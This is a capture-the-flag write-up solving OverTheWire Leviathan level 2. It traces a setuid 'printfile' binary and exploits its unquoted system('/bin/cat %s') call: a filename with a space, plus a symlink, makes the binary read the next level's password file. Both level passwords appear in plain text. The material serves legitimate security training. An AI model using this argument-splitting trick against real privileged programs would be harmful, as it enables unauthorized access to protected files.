# Leviathan Level 2 → Level 3
There is no information for this level, intentionally.

## Solution

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
```
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

```
leviathan2@leviathan.labs.overthewire.org's password: ougahZi8Ta
```
Linux leviathan 4.18.12 x86_64 GNU/Linux
```               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
               
```             
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!

  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!
```
leviathan2@leviathan:~$ ls -al                                          #list all the contents in the homedirectory of leviathan2
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile         #there is a setuid file named as printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile

leviathan2@leviathan:~$ file printfile                                  #to know the file type of printfile
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped

leviathan2@leviathan:~$ ./printfile                                     #since it is an executable file, execute it
*** File Printer ***
Usage: ./printfile filename                                             #it prints any file mentioned with it

leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3      #try to print the leviathan3 password file
You cant have that file...

                                                                        #make a file to test the setuid file
                                                                       

leviathan2@leviathan:~$ mkdir /tmp/myl2                                 #create a directory myl2 under temp

leviathan2@leviathan:~$ cd /tmp/myl2                                    #navigate to myl2 directory

leviathan2@leviathan:/tmp/myl2$ touch test.txt                          #create a file test.txt in the myl2 directory

leviathan2@leviathan:/tmp/myl2$ ltrace ~/printfile test.txt             #see the function of the setuid file with this test file
__libc_start_main(0x804852b, 2, 0xffffd744, 0x8048610 <unfinished ...>
access("test.txt", 4)                            = 0
snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat test.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```
### Note1: From the above output, a security hole can be witnessed. access() checks permissions based on the process’ real user ID rather than the effective user ID. Since printfile is owned by leviathan3, access() will call the process with leviathan3’s privileges.
### Note2: While access() uses the full path’s filename, /bin/cat uses just the first part of the filename. Add a space to a filename, then /bin/cat will read the file as 2 separate files.
```
leviathan2@leviathan:/tmp/myl2$ touch pass\ file.txt                            #create a file named as "pass file.txt"

leviathan2@leviathan:/tmp/myl2$ ltrace ~/printfile "pass file.txt"
__libc_start_main(0x804852b, 2, 0xffffd744, 0x8048610 <unfinished ...>
access("pass file.txt", 4)                       = 0
snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++                                                       #/bin/cat calls "pass file.txt" as two seperate files "pass" and "file.txt"

leviathan2@leviathan:/tmp/myl2$ ln -s /etc/leviathan_pass/leviathan3 /tmp/myl2/pass          #create a symbolic link for "pass" part of "pass file.txt" and link it to the leviathan3 password file

leviathan2@leviathan:/tmp/myl2$ ls -la                                                       #verify the output of the above process
total 268
drwxr-sr-x   2 leviathan2 root   4096 Feb 13 10:57 .
drwxrws-wt 185 root       root 266240 Feb 13 10:56 ..
lrwxrwxrwx   1 leviathan2 root     30 Feb 13 10:57 pass -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Feb 13 10:55 pass file.txt
-rw-r--r--   1 leviathan2 root      0 Feb 13 10:51 test.txt

leviathan2@leviathan:/tmp/myl2$ ~/printfile "pass file.txt"                                   #now run the setuid file for the "pass file.txt"
Ahdiemoo1j                                                                                    #leviathan3 password
/bin/cat: file.txt: No such file or directory

leviathan2@leviathan:/tmp/myl2$ rm -rf /tmp/myl2                                              #delete the created myl2 directory

leviathan2@leviathan:/tmp/myl2$ exit                                                          #logout from leviathan.labs.overthewire.org
logout
Connection to leviathan.labs.overthewire.org closed.                      

```


#### Command-line help text
```
mkdir-> make directories
file -> determine file type

ls   -> list directory contents
-a   -> do not ignore entries starting with .
-l   -> use a long listing format

cd   -> change the working directory
cat  -> concatenate files and print on the standard output
grep -> print lines matching a pattern
touch-> create a file/ change file timestamps
ln   -> make links between files
-s   -> make symbolic links instead of hard links

rm   -> remove files or directories
-r   -> remove directories and their contents recursively
-f   -> ignore nonexistent files, never prompt
```

